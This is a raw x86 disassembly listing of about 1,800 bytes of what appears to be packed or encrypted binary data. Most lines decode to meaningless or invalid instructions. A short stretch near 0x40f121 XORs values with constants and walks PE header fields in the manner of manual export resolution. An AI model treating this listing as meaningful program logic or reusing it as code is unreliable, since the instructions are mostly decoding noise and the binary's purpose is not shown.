  40ee11:	fsub   st(0),st
  40ee13:	and    al,0x13
  40ee15:	push   eax
  40ee16:	xchg   eax,edi
  40ee18:	call   0x4d12:0x46ab5b74
  40ee1f:	jno    0x40ee55
  40ee21:	dec    esi
  40ee22:	push   edx
  40ee23:	mov    dl,dl
  40ee25:	leave  
  40ee26:	jbe    0x40edd2
  40ee28:	sbb    DWORD PTR [edi-0x3f571a98],ecx
  40ee2e:	cmc    
  40ee2f:	mov    ds:0xe3fad713,al
  40ee34:	or     edx,DWORD PTR [ecx]
  40ee36:	mov    eax,DWORD PTR [esi]
  40ee38:	aaa    
  40ee39:	fdiv   st,st(2)
  40ee3b:	test   bl,dh
  40ee3d:	jb     0x40ee7e
  40ee3f:	xchg   ebx,eax
  40ee40:	and    esp,esi
  40ee42:	pop    eax
  40ee43:	add    eax,0xcc236bb
  40ee48:	cdq    
  40ee49:	retf   
  40ee4a:	in     eax,dx
  40ee4b:	mov    ds:0xe4a4ef71,al
  40ee50:	aas    
  40ee51:	cmp    DWORD PTR [edi-0x9],esi
  40ee54:	sbb    ebx,DWORD PTR [edx-0x79]
  40ee57:	sbb    esi,ebp
  40ee59:	call   0x523b:0xbc6f3686
  40ee60:	es dec ebp
  40ee62:	adc    al,0xd3
  40ee64:	lods   al,BYTE PTR ds:[esi]
  40ee65:	add    ah,dh
  40ee67:	(bad)  
  40ee68:	in     al,0x96
  40ee6a:	daa    
  40ee6b:	and    eax,0x660716dc
  40ee70:	aaa    
  40ee71:	jnp    0x40ee99
  40ee73:	test   BYTE PTR fs:[ebx+0x740e460a],al
  40ee7a:	dec    edi
  40ee7b:	test   eax,0xf888e55d
  40ee80:	jp     0x40eecf
  40ee82:	xchg   ecx,eax
  40ee83:	sbb    al,dh
  40ee85:	inc    DWORD PTR [eax+0x531cc6a]
  40ee8b:	jns    0x40ee82
  40ee8d:	ficom  WORD PTR [esi]
  40ee8f:	mov    esi,0x1ffb30fb
  40ee94:	xlat   BYTE PTR ds:[ebx]
  40ee95:	jecxz  0x40ee35
  40ee97:	ret    0x41b0
  40ee9a:	ins    DWORD PTR es:[edi],dx
  40ee9b:	add    edx,DWORD PTR [ebx]
  40ee9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee9e:	ficom  WORD PTR [esi]
  40eea0:	mov    ds:0x9051c7d8,al
  40eea5:	dec    esi
  40eea6:	adc    eax,0xdb820996
  40eeab:	and    DWORD PTR [edx-0x60],esp
  40eeae:	and    eax,0x21bf1855
  40eeb3:	push   cs
  40eeb4:	pushf  
  40eeb5:	test   ch,cl
  40eeb7:	cwde   
  40eeb8:	pop    ds
  40eeb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeba:	mov    bh,0xf
  40eebc:	dec    edx
  40eebd:	test   BYTE PTR [esi+0x5e70052b],ch
  40eec3:	test   eax,0x809e1820
  40eec8:	push   ebx
  40eec9:	sbb    ebx,DWORD PTR [edx]
  40eecb:	fidivr WORD PTR [ebx+0x69]
  40eece:	inc    edi
  40eecf:	out    0x27,eax
  40eed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eed2:	adc    ecx,ecx
  40eed4:	xor    DWORD PTR [edi-0x71d32535],0xc4e4cba
  40eede:	mov    bh,0x1c
  40eee0:	mov    dl,0x1b
  40eee2:	sub    DWORD PTR [ebp+0x17c6f381],esi
  40eee8:	cmp    eax,0x4003ef2
  40eeed:	pop    DWORD PTR [ebp+esi*2-0x3ca10687]
  40eef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eef5:	jmp    0x93c0929d
  40eefa:	das    
  40eefb:	mov    edx,0xdf579cd4
  40ef00:	dec    edi
  40ef01:	adc    ebp,eax
  40ef03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef04:	mov    ebp,0x3d08a86d
  40ef09:	xor    esi,DWORD PTR ds:0x4ce72c02
  40ef0f:	mov    edi,0x6803a3a3
  40ef14:	fsubr  QWORD PTR gs:[eax]
  40ef17:	mov    esi,DWORD PTR [esi]
  40ef19:	adc    bl,BYTE PTR [ebx+0x7]
  40ef1c:	pop    edi
  40ef1d:	dec    ebx
  40ef1e:	stos   BYTE PTR es:[edi],al
  40ef1f:	pop    ebx
  40ef20:	in     eax,dx
  40ef21:	sbb    al,0xbf
  40ef23:	xor    bl,BYTE PTR [eax+ebx*2]
  40ef26:	aad    0x86
  40ef28:	fwait
  40ef29:	inc    ebp
  40ef2a:	mov    ecx,0x87fe54f7
  40ef2f:	lods   eax,DWORD PTR ds:[esi]
  40ef30:	arpl   WORD PTR [edi-0x7c],sp
  40ef33:	fs cmc 
  40ef35:	lods   al,BYTE PTR ds:[esi]
  40ef36:	popf   
  40ef37:	ffreep st(1)
  40ef39:	popa   
  40ef3a:	inc    eax
  40ef3b:	push   edi
  40ef3c:	push   ecx
  40ef3d:	sub    ecx,DWORD PTR [esi+0x1]
  40ef40:	add    BYTE PTR [ebx],0xa6
  40ef43:	jmp    0x4851:0xd8968341
  40ef4a:	(bad)  
  40ef4b:	ficomp DWORD PTR [ecx+0x2d26f6d3]
  40ef51:	pop    ebp
  40ef52:	dec    ebx
  40ef53:	add    BYTE PTR [esi],cl
  40ef55:	stc    
  40ef56:	jge    0x40efbc
  40ef58:	mov    bh,0x67
  40ef5a:	enter  0xf085,0x2c
  40ef5e:	mov    ds:0x6837002a,al
  40ef63:	(bad)  
  40ef64:	mov    eax,0x8cfc164b
  40ef69:	(bad)  [edi+ebp*4-0x49f85a7f]
  40ef70:	cmc    
  40ef71:	leave  
  40ef72:	pop    ss
  40ef73:	xchg   edx,eax
  40ef74:	adc    al,0xfe
  40ef76:	(bad)  
  40ef78:	push   0xac69edbd
  40ef7d:	or     ebp,eax
  40ef7f:	push   ecx
  40ef80:	stos   DWORD PTR es:[edi],eax
  40ef81:	inc    eax
  40ef82:	jno    0x40ef3b
  40ef84:	ficom  DWORD PTR [ebp+0x51bd0aad]
  40ef8a:	dec    edi
  40ef8b:	dec    ecx
  40ef8c:	das    
  40ef8d:	cmp    ch,BYTE PTR es:[esi]
  40ef90:	jmp    0x465a4927
  40ef95:	dec    ebx
  40ef96:	cdq    
  40ef97:	fcomp  QWORD PTR [ecx+0x44f62763]
  40ef9d:	stc    
  40ef9e:	test   BYTE PTR [ebp+esi*8+0x65cac178],0x7d
  40efa6:	lahf   
  40efa7:	add    BYTE PTR [ecx-0x2d],bl
  40efaa:	shl    DWORD PTR [esp+ecx*2+0x4b],0x32
  40efaf:	bound  ecx,QWORD PTR ds:0xe25b3a88
  40efb5:	lahf   
  40efb6:	dec    esi
  40efb7:	push   0x0
  40efb9:	mov    esi,0x76cf058f
  40efbe:	xchg   ebx,eax
  40efbf:	pop    edi
  40efc0:	sti    
  40efc1:	outs   dx,BYTE PTR ds:[esi]
  40efc2:	shl    BYTE PTR [edx-0xc1f401],1
  40efc8:	and    BYTE PTR [edx+0x34ca50fb],dh
  40efce:	(bad)  
  40efd0:	xchg   ebp,eax
  40efd1:	retf   0xd608
  40efd4:	arpl   WORD PTR [ecx+0xc],si
  40efd7:	clc    
  40efd8:	pop    edi
  40efd9:	sub    eax,ebp
  40efdb:	daa    
  40efdc:	cmp    bl,0xf7
  40efdf:	ins    DWORD PTR es:[edi],dx
  40efe0:	call   0xdd158f95
  40efe5:	aad    0x10
  40efe7:	pop    es
  40efe8:	test   DWORD PTR [ebx+0x62e254fa],0xa9640915
  40eff2:	xchg   DWORD PTR [edx-0x47],edi
  40eff5:	push   0xdea1c40
  40effa:	cmc    
  40effb:	and    eax,0x9d060066
  40f000:	pop    edx
  40f001:	(bad)  
  40f002:	fisttp QWORD PTR [ebp+0x63]
  40f005:	sbb    DWORD PTR [edx+eiz*2],edi
  40f008:	lods   eax,DWORD PTR ds:[esi]
  40f009:	pop    ebx
  40f00a:	xchg   esi,eax
  40f00b:	cs (bad) 
  40f00d:	scas   al,BYTE PTR es:[edi]
  40f00e:	xchg   esi,eax
  40f00f:	outs   dx,BYTE PTR ds:[esi]
  40f010:	into   
  40f011:	xchg   eax,eax
  40f013:	jmp    0x1d65e45f
  40f018:	mov    ch,0xb6
  40f01a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f01b:	out    0x27,al
  40f01d:	dec    ebp
  40f01e:	inc    esi
  40f01f:	scas   al,BYTE PTR es:[edi]
  40f020:	and    eax,0x9ab6e42f
  40f025:	mov    cl,0xf
  40f027:	sub    edi,DWORD PTR [esi-0x11074175]
  40f02d:	leave  
  40f02e:	iret   
  40f02f:	mov    edi,0xda469006
  40f034:	pop    ss
  40f035:	xor    edx,esi
  40f037:	push   ss
  40f038:	(bad)  
  40f039:	mov    ds,edx
  40f03b:	inc    ebx
  40f03c:	outs   dx,BYTE PTR ds:[esi]
  40f03d:	mov    edi,0xbf7bc755
  40f042:	loop   0x40f0c3
  40f044:	inc    edx
  40f045:	mov    cl,0xb6
  40f047:	in     eax,dx
  40f048:	xchg   ebx,eax
  40f049:	(bad)  
  40f04a:	mov    ds:0x6a4e742e,eax
  40f04f:	sbb    BYTE PTR [ecx+0x65],cl
  40f052:	mov    ah,0xf
  40f054:	arpl   bp,ax
  40f056:	imul   eax,ebp,0xb9e54cb9
  40f05c:	mov    dl,0x2d
  40f05e:	in     al,dx
  40f05f:	jno    0x40f07b
  40f061:	push   cs
  40f062:	fstp   DWORD PTR [edx-0x6fc812c]
  40f068:	jbe    0x40f046
  40f06a:	xor    BYTE PTR [ebx+0x39],ah
  40f06d:	jmp    0x8d34:0x31c6c9e1
  40f074:	push   ebx
  40f075:	push   ebx
  40f076:	fsub   QWORD PTR [esi+0x4b]
  40f079:	push   edx
  40f07a:	ins    DWORD PTR es:[edi],dx
  40f07b:	pop    esp
  40f07c:	inc    esi
  40f07d:	pop    ss
  40f07e:	rol    BYTE PTR [ecx+0x2e],1
  40f081:	xchg   BYTE PTR [ecx+0x3e],dh
  40f084:	arpl   bp,sp
  40f086:	aas    
  40f087:	scas   al,BYTE PTR es:[edi]
  40f088:	mov    edx,esp
  40f08a:	setbe  BYTE PTR [esi+0x36]
  40f08e:	sbb    al,0x2
  40f090:	js     0x40f0c2
  40f092:	std    
  40f093:	cli    
  40f094:	fdivr  DWORD PTR [edx+0x6f37f1de]
  40f09a:	fcomi  st,st(5)
  40f09c:	cmp    edx,DWORD PTR [eax-0x63]
  40f09f:	dec    edx
  40f0a0:	and    edi,esp
  40f0a2:	add    al,al
  40f0a4:	sbb    eax,0x10e7dfd2
  40f0a9:	sub    al,0x3
  40f0ab:	xor    esp,DWORD PTR [ebx]
  40f0ad:	repnz in eax,dx
  40f0af:	mov    ebp,0xc502356e
  40f0b4:	or     esi,edi
  40f0b6:	hlt    
  40f0b7:	aam    0x12
  40f0b9:	jle    0x40f0d0
  40f0bb:	pop    ds
  40f0bc:	or     BYTE PTR [ebp-0x15],al
  40f0bf:	push   cs
  40f0c0:	test   DWORD PTR [esi-0x1059b96f],0x1cf5b37f
  40f0ca:	or     ecx,esi
  40f0cc:	cwde   
  40f0cd:	stos   BYTE PTR es:[edi],al
  40f0ce:	pop    ebx
  40f0cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0d0:	mov    esi,0x8b12c264
  40f0d5:	fimul  WORD PTR [ebp+0x57]
  40f0d8:	cmp    BYTE PTR [esi+0x5bf3122e],bl
  40f0de:	dec    edi
  40f0df:	ins    DWORD PTR es:[edi],dx
  40f0e0:	adc    eax,0x40295961
  40f0e5:	jae    0x40f0f0
  40f0e7:	js     0x40f0e2
  40f0e9:	adc    eax,0x35b7da97
  40f0ee:	into   
  40f0ef:	daa    
  40f0f0:	sub    esi,DWORD PTR [ecx-0x7e]
  40f0f3:	ret    0x11a5
  40f0f6:	inc    esi
  40f0f7:	push   esi
  40f0f8:	add    BYTE PTR [edi],0x61
  40f0fb:	or     bh,BYTE PTR [ebx-0x1d2195f5]
  40f101:	idiv   BYTE PTR [esi-0x23d38974]
  40f107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f108:	inc    esp
  40f109:	retf   
  40f10a:	std    
  40f10b:	ins    DWORD PTR es:[edi],dx
  40f10c:	je     0x40f110
  40f10e:	jl     0x40f14b
  40f110:	dec    ebx
  40f111:	mov    DWORD PTR [ebx],esp
  40f113:	int    0xe7
  40f115:	into   
  40f116:	cwde   
  40f117:	xor    dl,BYTE PTR [edi-0x516dd596]
  40f11d:	mov    bl,0x47
  40f11f:	jns    0x40f196
  40f121:	xchg   esp,eax
  40f122:	mov    ecx,eax
  40f124:	xor    eax,eax
  40f126:	shr    edx,0x2
  40f129:	or     edx,DWORD PTR [ebp+0x14]
  40f12c:	mov    DWORD PTR [ebp+0x10],eax
  40f12f:	mov    eax,DWORD PTR [ebx]
  40f131:	shl    ecx,0x1e
  40f134:	xor    ecx,0xc0000000
  40f13a:	mov    DWORD PTR [ebp-0x64],edx
  40f13d:	mov    edx,DWORD PTR [ebx+0x4]
  40f140:	xor    eax,0xba699573
  40f145:	mov    DWORD PTR [ebp+0x14],ecx
  40f148:	mov    ecx,0x9c0a89d8
  40f14d:	xor    edx,ecx
  40f14f:	shrd   eax,edx,0x2
  40f153:	or     eax,DWORD PTR [ebp+0x10]
  40f156:	shr    edx,0x2
  40f159:	mov    DWORD PTR [ebp-0x70],eax
  40f15c:	mov    eax,edx
  40f15e:	or     eax,DWORD PTR [ebp+0x14]
  40f161:	mov    DWORD PTR [ebp-0x5c],edx
  40f164:	mov    DWORD PTR [ebp-0x6c],eax
  40f167:	mov    eax,DWORD PTR [ebp-0x70]
  40f16a:	cmp    DWORD PTR [ebp-0x68],eax
  40f16d:	jne    0x40f17f
  40f173:	mov    eax,DWORD PTR [ebp-0x6c]
  40f176:	cmp    DWORD PTR [ebp-0x64],eax
  40f179:	je     0x40fcce
  40f17f:	mov    eax,DWORD PTR [ebp+0x8]
  40f182:	mov    edx,DWORD PTR [ebp+0xc]
  40f185:	mov    edx,DWORD PTR [ebp-0x4]
  40f188:	mov    edx,DWORD PTR [edx+0x3c]
  40f18b:	lea    eax,[edx+eax*8+0x78]
  40f18f:	mov    edx,DWORD PTR [ebp-0x4]
  40f192:	mov    eax,DWORD PTR [edx+eax*1]
  40f195:	mov    DWORD PTR [ebp-0x24],eax
  40f198:	jmp    0x40f722
  40f19d:	mov    al,ds:0x187ff383
  40f1a2:	jle    0x40f1c4
  40f1a4:	sub    BYTE PTR [eax+0x4da848bd],cl
  40f1aa:	xor    DWORD PTR [eax-0x52],esi
  40f1ad:	mov    ch,0x86
  40f1af:	push   ss
  40f1b0:	push   ss
  40f1b1:	cmp    eax,0xe1161604
  40f1b6:	jno    0x40f178
  40f1b8:	aaa    
  40f1b9:	rcr    BYTE PTR [edx-0x49aa79c0],1
  40f1bf:	div    BYTE PTR [ebp-0x34]
  40f1c2:	cld    
  40f1c3:	dec    ebx
  40f1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c5:	cs dec edi
  40f1c7:	push   ebp
  40f1c8:	stc    
  40f1c9:	lods   al,BYTE PTR ds:[esi]
  40f1ca:	mov    ah,0xcd
  40f1cc:	popa   
  40f1cd:	neg    BYTE PTR [ecx]
  40f1cf:	dec    ebp
  40f1d0:	cmp    al,0x92
  40f1d2:	lods   al,BYTE PTR ds:[esi]
  40f1d3:	xor    DWORD PTR es:[esi+edx*4-0x59],edx
  40f1d8:	test   DWORD PTR ds:[ebx-0x40],edx
  40f1dc:	cdq    
  40f1dd:	cmp    DWORD PTR [edi],ecx
  40f1df:	es jb  0x40f183
  40f1e2:	pop    edx
  40f1e3:	fild   WORD PTR [eax+eiz*2]
  40f1e6:	fldz   
  40f1e8:	cs jae 0x40f21d
  40f1eb:	cmp    ecx,DWORD PTR [ebp+0x5c0ecb15]
  40f1f1:	pop    ds
  40f1f2:	mov    ecx,0x12890575
  40f1f7:	mov    bl,dh
  40f1f9:	pop    esi
  40f1fa:	mov    ebp,0x88a446a6
  40f1ff:	mov    edx,0xb79031e9
  40f204:	in     eax,0xd4
  40f206:	shl    BYTE PTR [ebp+ebp*4+0x41],1
  40f20a:	sbb    al,BYTE PTR [eax+0x62001a8e]
  40f210:	cdq    
  40f211:	mov    ?,WORD PTR [eax+0x3a]
  40f214:	mov    ecx,0x9f564c7a
  40f219:	ficom  WORD PTR es:[ebx-0x2cd6bfc5]
  40f220:	mov    edx,0xdbcc0e86
  40f225:	dec    esp
  40f226:	and    esi,DWORD PTR [eax+0x3d9379c8]
  40f22c:	outs   dx,BYTE PTR ds:[esi]
  40f22d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f22e:	mov    eax,0xeb7d9174
  40f233:	bound  ebp,QWORD PTR [edx-0x12a17a8e]
  40f239:	fucomp st(1)
  40f23b:	dec    esp
  40f23c:	popa   
  40f23d:	jno    0x40f2af
  40f23f:	inc    ebx
  40f240:	scas   eax,DWORD PTR es:[edi]
  40f241:	(bad)  
  40f243:	test   eax,0x2a104c3f
  40f248:	cmp    eax,0xa317a129
  40f24d:	jb     0x40f20f
  40f24f:	sub    cl,al
  40f251:	xor    esp,0xffffffc0
  40f254:	dec    eax
  40f255:	add    al,0xcc
  40f257:	mov    ebx,0x775f7598
  40f25c:	outs   dx,DWORD PTR ds:[esi]
  40f25d:	xor    cl,BYTE PTR [ebx+0xf81441]
  40f263:	jne    0x40f215
  40f265:	push   esp
  40f266:	or     BYTE PTR [ebx],ch
  40f268:	jno    0x40f2cd
  40f26a:	sbb    DWORD PTR [edx-0x38edea55],esi
  40f270:	or     ah,BYTE PTR [ebx-0x5d1b5312]
  40f276:	pop    ds
  40f277:	test   BYTE PTR ds:0x50d5ef83,dh
  40f27d:	sbb    bl,BYTE PTR [edi]
  40f27f:	jmp    0x176f934c
  40f284:	pop    ecx
  40f285:	retf   0xa885
  40f288:	lahf   
  40f289:	sbb    esp,esp
  40f28b:	adc    BYTE PTR [edx+0x32],dh
  40f28e:	je     0x40f22f
  40f290:	lods   al,BYTE PTR ds:[esi]
  40f291:	sbb    DWORD PTR [edx+eax*8],0xb
  40f295:	jbe    0x40f254
  40f297:	call   0xfe737a13
  40f29c:	sbb    DWORD PTR [eax-0x63c39d30],edi
  40f2a2:	lea    edi,[eax+0x462be703]
  40f2a8:	arpl   bp,cx
  40f2aa:	mov    dl,BYTE PTR [ecx-0x4b]
  40f2ad:	out    0x9,al
  40f2af:	mov    ds,edx
  40f2b1:	sub    eax,0x8e3d7f3e
  40f2b6:	addr16 in al,0xe1
  40f2b9:	push   ebx
  40f2ba:	xor    DWORD PTR [esi+0x6d],ebp
  40f2bd:	repnz repz cmp eax,0xedd433c6
  40f2c4:	push   esi
  40f2c5:	std    
  40f2c6:	(bad)  
  40f2c7:	mov    edi,0x34cf0905
  40f2cc:	aaa    
  40f2cd:	hlt    
  40f2ce:	out    dx,al
  40f2cf:	pop    ecx
  40f2d0:	xchg   edi,eax
  40f2d1:	fsubr  QWORD PTR [edi]
  40f2d3:	bound  edx,QWORD PTR [eax]
  40f2d5:	pop    ecx
  40f2d6:	iret   
  40f2d7:	push   0xc2fc400c
  40f2dc:	das    
  40f2dd:	(bad)
  40f2e0:	js     0x40f2ea
  40f2e2:	mov    dl,0xc3
  40f2e4:	mov    eax,ds:0xec7989f8
  40f2e9:	imul   ecx,DWORD PTR [edx-0x327ad800],0xffffffb3
  40f2f0:	xor    eax,DWORD PTR [edx-0xa6c476]
  40f2f6:	dec    esi
  40f2f7:	push   edi
  40f2f8:	cmp    DWORD PTR [esi+edx*2],eax
  40f2fb:	aam    0x3
  40f2fd:	imul   edx,DWORD PTR [ebx],0xfffffffc
  40f300:	xor    BYTE PTR ds:0xaf011a51,cl
  40f306:	daa    
  40f307:	cmc    
  40f308:	std    
  40f309:	push   es
  40f30a:	inc    ecx
  40f30b:	push   ebp
  40f30c:	mov    ss,WORD PTR ds:0x3410fdf
  40f312:	pusha  
  40f313:	jge    0x40f2d2
  40f315:	retf   
  40f316:	out    dx,al
  40f317:	cwde   
  40f318:	je     0x40f362
  40f31a:	jns    0x40f32f
  40f31c:	mov    esp,0x9f8a972d
  40f321:	shl    DWORD PTR [esi-0x4e70a7b1],cl
  40f327:	call   0xb90db60
  40f32c:	pop    esp
  40f32d:	or     al,0x75
  40f32f:	in     al,dx
  40f330:	mov    dh,0x6a
  40f332:	or     ecx,edx
  40f334:	push   0x54
  40f336:	mov    WORD PTR [eax+0x39],ss
  40f339:	psrld  mm5,QWORD PTR [eax-0x76]
  40f33d:	inc    ebp
  40f33e:	xchg   BYTE PTR [edx-0x50],dh
  40f341:	xchg   ebx,eax
  40f342:	rcl    BYTE PTR [ebp-0x62],0x4a
  40f346:	sub    dh,BYTE PTR [edi+eiz*2+0x0]
  40f34a:	mov    esi,0xaeb94f48
  40f34f:	mov    ds,edx
  40f351:	mov    edi,0xf8082aa3
  40f356:	test   BYTE PTR [ecx],ah
  40f358:	test   al,0x1d
  40f35a:	xchg   edx,eax
  40f35b:	test   DWORD PTR [edx+0x21],ecx
  40f35e:	adc    ecx,edi
  40f360:	enter  0x86e0,0x41
  40f364:	fist   DWORD PTR [edx-0x7e1e8ff4]
  40f36a:	push   ebp
  40f36b:	outs   dx,BYTE PTR ds:[esi]
  40f36c:	scas   al,BYTE PTR es:[edi]
  40f36d:	mov    dl,0x2c
  40f36f:	xor    BYTE PTR [ecx+0x7df4b35d],0x8f
  40f376:	shr    DWORD PTR [ebx+0x10ece6c1],0xac
  40f37d:	dec    esp
  40f37e:	sub    DWORD PTR [eax],esi
  40f380:	fadd   DWORD PTR [ecx-0x81d7981]
  40f386:	cmp    eax,0x840f433b
  40f38b:	mov    esp,DWORD PTR [ebx+0x7b7ab8c8]
  40f391:	mov    es,ebx
  40f393:	add    bh,dh
  40f395:	ds stc 
  40f397:	nop
  40f398:	pop    esp
  40f399:	(bad)  
  40f39a:	push   edi
  40f39b:	std    
  40f39c:	xchg   ecx,eax
  40f39d:	pop    es
  40f39e:	mov    ah,0xd2
  40f3a0:	in     al,0x13
  40f3a2:	test   esp,ebx
  40f3a4:	pop    ebx
  40f3a5:	jp     0x40f3b1
  40f3a7:	xor    al,0xca
  40f3a9:	inc    esp
  40f3aa:	sbb    BYTE PTR [edi+eiz*2],ch
  40f3ad:	jae    0x40f3b8
  40f3af:	mov    al,0x9
  40f3b1:	pop    ecx
  40f3b2:	cwde   
  40f3b3:	xor    esp,DWORD PTR [ebx]
  40f3b5:	xor    al,0x7b
  40f3b7:	sub    al,0xf1
  40f3b9:	test   eax,0x44bb4f5e
  40f3be:	xor    al,0xb1
  40f3c0:	(bad)  
  40f3c1:	mov    esp,0xdf0d1983
  40f3c6:	ins    BYTE PTR es:[edi],dx
  40f3c7:	js     0x40f3a8
  40f3c9:	mov    al,0xd0
  40f3cb:	in     eax,0x6b
  40f3cd:	popf   
  40f3ce:	jae    0x40f374
  40f3d0:	sbb    eax,0xb28c808f
  40f3d5:	dec    esp
  40f3d6:	ins    BYTE PTR es:[edi],dx
  40f3d7:	retf   
  40f3d8:	jbe    0x40f3c9
  40f3da:	div    DWORD PTR [edx+0x3198cc32]
  40f3e0:	dec    ecx
  40f3e1:	test   DWORD PTR [edx+eax*8+0x4dad9cbc],ebp
  40f3e8:	xchg   ebp,eax
  40f3e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ea:	jp     0x40f3fe
  40f3ec:	test   al,0x8d
  40f3ee:	pusha  
  40f3ef:	adc    al,BYTE PTR [ebx-0x2d]
  40f3f2:	sub    BYTE PTR [ebx+0x516a8e34],ah
  40f3f8:	pop    edi
  40f3f9:	pop    ecx
  40f3fa:	and    eax,0xa5ec3c64
  40f3ff:	out    dx,al
  40f400:	pushf  
  40f401:	jb     0x40f3bc
  40f403:	scas   al,BYTE PTR es:[edi]
  40f404:	dec    edx
  40f405:	sahf   
  40f406:	cmp    ch,ah
  40f408:	mov    ch,0x4b
  40f40a:	jle    0x40f38e
  40f40c:	pop    edi
  40f40d:	jecxz  0x40f390
  40f40f:	stos   BYTE PTR es:[edi],al
  40f410:	mov    gs,WORD PTR [eax+0x2dcccba3]
  40f416:	(bad)  
  40f417:	and    BYTE PTR [edi+eax*2+0x30],ah
  40f41b:	push   ss
  40f41c:	retf   0x23f9
  40f41f:	push   ebx
  40f420:	cmp    esi,DWORD PTR [esi-0x4211597c]
  40f426:	mov    al,0x73
  40f428:	mov    ds:0xd301d640,al
  40f42d:	cmp    eax,0x3cc525ff
  40f432:	xor    edi,DWORD PTR [ebx+eax*4-0x16]
  40f436:	inc    esp
  40f437:	fld    TBYTE PTR [ebx-0x3fa8c4af]
  40f43d:	stos   BYTE PTR es:[edi],al
  40f43e:	sbb    DWORD PTR [edx-0x10c8632c],esi
  40f444:	sbb    al,0x6e
  40f446:	mov    edx,DWORD PTR [edx]
  40f448:	mov    ebx,0xbc158e54
  40f44d:	pop    edx
  40f44e:	repnz cmp eax,DWORD PTR [ebx]
  40f451:	xchg   ecx,eax
  40f452:	daa    
  40f453:	mov    gs:0xb3c8f0d2,eax
  40f459:	dec    edi
  40f45a:	cmc    
  40f45b:	loop   0x40f43f
  40f45d:	ret    0x46a8
  40f460:	(bad)  
  40f461:	push   edi
  40f462:	cli    
  40f463:	arpl   WORD PTR [ecx],bx
  40f465:	pusha  
  40f466:	ja     0x40f481
  40f468:	xchg   ebx,eax
  40f469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f46a:	inc    ebx
  40f46b:	mov    ch,0xc5
  40f46d:	jmp    0x6b19:0x181eb28c
  40f474:	add    eax,0x256dd9e9
  40f479:	and    eax,0x5e8ab8b3
  40f47e:	push   0xffffffe4
  40f480:	push   esi
  40f481:	mov    al,0xb0
  40f483:	in     eax,0x7b
  40f485:	sub    cl,dl
  40f487:	ret    0x63a0
  40f48a:	into   
  40f48b:	ror    DWORD PTR [edx+0x5],0x3a
  40f48f:	pop    ecx
  40f490:	loop   0x40f4f9
  40f492:	mov    al,0x77
  40f494:	repnz shl DWORD PTR ds:0x85938b0a,1
  40f49b:	dec    eax
  40f49c:	pop    edx
  40f49d:	xchg   esp,eax
  40f49e:	xchg   ebx,eax
  40f49f:	(bad)
  40f4a4:	sahf   
  40f4a5:	jno    0x40f500
  40f4a7:	(bad)  
  40f4a8:	push   edx
  40f4a9:	dec    ebx
  40f4aa:	es cmp eax,0xbc427588
  40f4b0:	pop    eax
  40f4b1:	aaa    
  40f4b2:	jmp    0x7bfd:0xa1525cc3
  40f4b9:	aad    0xe8
  40f4bb:	iret   
  40f4bc:	inc    ebp
  40f4bd:	retf   0x4f2d
  40f4c0:	retf   0xb8bb
  40f4c3:	stos   DWORD PTR es:[edi],eax
  40f4c4:	loope  0x40f4a4
  40f4c6:	xor    esp,esi
  40f4c8:	adc    al,al
  40f4ca:	icebp  
  40f4cb:	sbb    esp,edx
  40f4cd:	out    dx,al
  40f4ce:	adc    dl,ch
  40f4d0:	push   esp
  40f4d1:	test   ah,0xb9
  40f4d4:	jle    0x40f501
  40f4d6:	fs cwde 
  40f4d8:	adc    ecx,DWORD PTR [eax+0x7dda2ca3]
  40f4de:	add    eax,0x7552dfff
  40f4e3:	jae    0x40f53e
  40f4e5:	xchg   ebp,eax
  40f4e6:	repnz div BYTE PTR [ebp-0x32]
  40f4ea:	ja     0x40f54d
  40f4ec:	mov    eax,0x52b31bab
  40f4f1:	pop    edi
  40f4f2:	pop    eax
  40f4f3:	stos   DWORD PTR es:[edi],eax
  40f4f4:	cwde   
  40f4f5:	repnz into 
  40f4f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4f8:	fcmovne st,st(5)
  40f4fa:	pop    esi
  40f4fb:	sbb    ebp,ecx
  40f4fd:	dec    edi
  40f4fe:	jle    0x40f4d1
  40f500:	sbb    DWORD PTR [edi-0x58f8e844],ecx
  40f506:	iret   
  40f507:	xchg   esp,eax
  40f508:	dec    ebp
  40f509:	outs   dx,DWORD PTR ds:[esi]
  40f50a:	int3   
  40f50b:	js     0x40f4bc
  40f50d:	out    dx,eax
  40f50e:	mov    dh,0x1f
  40f510:	(bad)  
  40f511:	push   ss
  40f512:	in     al,dx
  40f513:	mov    esp,0xfadef52a
  40f518:	mov    WORD PTR [eax],cs
  40f51a:	jmp    0x825df4ce
  40f51f:	add    esp,ebx
  40f521:	addr16 add al,0x27
  40f524:	mov    ds:0x6c5073d4,eax
  40f529:	enter  0x776f,0x72
  40f52d:	loop   0x40f592
  40f52f:	xor    ch,BYTE PTR [ebp+0x12]
  40f532:	xchg   edi,edi
  40f534:	pop    ds
  40f535:	in     eax,0x72
  40f537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f538:	call   DWORD PTR [edi]
  40f53a:	push   es
  40f53b:	pop    DWORD PTR [esi]
  40f53d:	repz cmp bl,BYTE PTR [eax+0x2c]
  40f541:	push   ebx
  40f542:	jge    0x40f4f9
  40f544:	sub    eax,0x22bf1178
  40f549:	aaa    
  40f54a:	shl    DWORD PTR [eax],0xf3
  40f54d:	js     0x40f535
  40f54f:	shl    al,cl
  40f551:	lahf   
  40f552:	push   cs
  40f553:	ja     0x40f537
  40f555:	xchg   edx,eax
  40f556:	dec    esi
  40f557:	adc    BYTE PTR [edi+0x30],0xa4
  40f55b:	imul   ebp,DWORD PTR [edi],0xffffffc5
  40f55e:	(bad)  
  40f560:	dec    edx
  40f561:	xlat   BYTE PTR ds:[ebx]
  40f562:	pop    eax
  40f563:	cli    
  40f564:	jle    0x40f5b3
  40f566:	cld    
  40f567:	xor    BYTE PTR [esi+0x6a93225a],dh
  40f56d:	lea    eax,[edi+0x6052313e]
